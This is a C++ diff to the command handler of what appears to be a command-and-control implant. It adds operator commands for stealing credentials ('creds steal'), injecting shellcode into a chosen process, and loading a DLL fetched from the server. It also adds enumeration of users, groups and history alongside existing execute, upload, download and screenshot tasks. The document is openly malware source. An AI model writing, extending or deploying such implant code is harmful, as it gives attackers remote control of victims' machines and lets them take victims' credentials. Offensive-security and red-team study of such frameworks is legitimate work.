@@ -138,6 +138,25 @@ namespace Handler
             }
             return Task::Cp(wArgs[1], wArgs[2]);
         }
+        else if (wcscmp(task.c_str(), L"creds steal") == 0)
+        {
+            return Task::CredsSteal();
+        }
+        else if (wcscmp(task.substr(0, 4).c_str(), L"dll ") == 0)
+        {
+            // Parse arguments.
+            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
+            if (wArgs.size() != 3)
+            {
+                return L"Error: Invalid argument.";
+            }
+            std::wstring wDllSrc;
+            for (size_t i = 2; i < wArgs.size(); i++)
+            {
+                wDllSrc += wArgs[i];
+            }
+            return Task::Dll(hConnect, wArgs[1], wDllSrc);
+        }
         else if (wcscmp(task.substr(0, 9).c_str(), L"download ") == 0)
         {
             // Parse arguments.
@@ -152,7 +171,15 @@ namespace Handler
         {
             return Task::Execute(task.substr(8, task.size()));
         }
-        else if (wcscmp(task.substr(0, 2).c_str(), L"ip") == 0)
+        else if (wcscmp(task.c_str(), L"groups") == 0)
+        {
+            return Task::Groups();
+        }
+        else if (wcscmp(task.c_str(), L"history") == 0)
+        {
+            return Task::History();
+        }
+        else if (wcscmp(task.c_str(), L"ip") == 0)
         {
             return Task::Ip();
         }
@@ -257,6 +284,22 @@ namespace Handler
             return L"Error: Cannot take a screenshot on DLL.";
             #endif
         }
+        else if (wcscmp(task.substr(0, 10).c_str(), L"shellcode ") == 0)
+        {
+            // Parse arguments
+            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
+            if (wArgs.size() != 3)
+            {
+                return L"Error: Invalid argument.";
+            }
+            std::wstring wPid = wArgs[1];
+            std::wstring wSrc;
+            for (size_t i = 2; i < wArgs.size(); i++)
+            {
+                wSrc += wArgs[i];
+            }
+            return Task::Shellcode(hConnect, wArgs[1], wSrc);
+        }
         else if (wcscmp(task.substr(0, 6).c_str(), L"sleep ") == 0)
         {
             return Task::Sleep(task.substr(6, task.size()), nSleep);
@@ -284,6 +327,10 @@ namespace Handler
                 return L"Error: Invalid argument.";
             }
             return Task::Upload(hConnect, wArgs[1], wArgs[2]);
+        }
+        else if (wcscmp(task.c_str(), L"users") == 0)
+        {
+            return Task::Users();
         }
         else if (wcscmp(task.c_str(), L"whoami") == 0)
         {
